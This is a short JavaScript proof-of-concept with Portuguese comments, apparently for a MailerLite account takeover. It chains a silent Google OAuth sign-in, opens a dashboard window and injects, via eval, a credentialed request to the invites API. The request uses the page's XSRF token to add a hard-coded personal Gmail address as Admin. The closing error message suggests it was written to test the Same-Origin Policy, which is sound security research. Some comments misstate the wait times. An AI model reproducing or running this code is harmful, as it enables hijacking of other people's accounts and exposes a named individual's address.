// Função para esperar X milissegundos
function esperar(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

(async () => {
  // Garante que tudo só começa se o parâmetro "start" estiver na URL
  if (window.top.location.search === "?start") {
    console.log("Parâmetro ?start detectado. Iniciando sequência...");

    // Espera 3 segundos e abre a janela de login do Google
    await esperar(5000);
    console.log("Abrindo janela de autenticação do Google...");
    window.top.open(
      "https://accounts.google.com/o/oauth2/v2/auth?as=AKF4tMmt3F52VXAA2Fq_tzFAUy9PRbyAzPqfTtLvsYI&client_id=588658642171-uatqq7pju7oriee4dhnno0f8oeekc047.apps.googleusercontent.com&scope=openid%20email%20profile&response_type=id_token&gsiwebsdk=gis_attributes&redirect_uri=https%3A%2F%2Faccounts.mailerlite.com%2Fauth%2Fgoogle%2Fcallback&response_mode=form_post&display=page&prompt=none&gis_params=Ch9odHRwczovL2FjY291bnRzLm1haWxlcmxpdGUuY29tEjRodHRwczovL2FjY291bnRzLm1haWxlcmxpdGUuY29tL2F1dGgvZ29vZ2xlL2NhbGxiYWNrGAciEGMyZGNiZDYwOGQzMTE4MzkqK0FLRjR0TW10M0Y1MlZYQUEyRnFfdHpGQVV5OVBSYnlBelBxZlR0THZzWUkySDU4ODY1ODY0MjE3MS11YXRxcTdwanU3b3JpZWU0ZGhubm8wZjhvZWVrYzA0Ny5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbTgCWiBodHRwczovL2FjY291bnRzLm1haWxlcmxpdGUuY29tLw"
    );

    // Espera mais 3 segundos antes de abrir o dashboard MailerLite
    await esperar(10000);
    console.log("Abrindo a nova janela para o MailerLite...");
 await esperar(15000);
    const novaJanela = window.top.open(
      "https://dashboard.mailerlite.com/products/168076388836836860/checkout/edit?ato"
    );

    try {
      // Tentativa de verificar o conteúdo da nova janela
      if (novaJanela && novaJanela.location.search.includes("?ato")) {
        console.log("Sucesso! A nova janela tem '?ato'. Agendando o fetch.");

        novaJanela.eval(`
          setTimeout(function() {
            console.log('Executando o fetch na janela do MailerLite');
            fetch('https://dashboard.mailerlite.com/api/invites', {
              method: 'PUT',
              headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json, text/plain, */*',
                'X-Xsrf-Token': xsrfToken,
                'X-Requested-With': 'XMLHttpRequest',
                'X-Acc-Id': accountId
              },
              body: JSON.stringify({
                role: "Admin",
                permissions: [],
                campaigns: [],
                requires_periodic_password_change: true,
                email: "gustavoribeirounic@gmail.com"
              }),
              credentials: 'include'
            });
          }, 4000);
        `);
      } else {
        console.log("A URL da nova janela não pôde ser lida ou não contém '?ato'.");
      }
    } catch (e) {
      console.error("ERRO CAPTURADO! O navegador bloqueou o acesso à nova janela como esperado.");
      console.error("Isso demonstra a Same-Origin Policy em ação.");
      console.error("Detalhes do erro:", e);
    }
  } else {
    console.log("Parâmetro ?start não encontrado. Nenhuma ação será executada.");
  }
})();
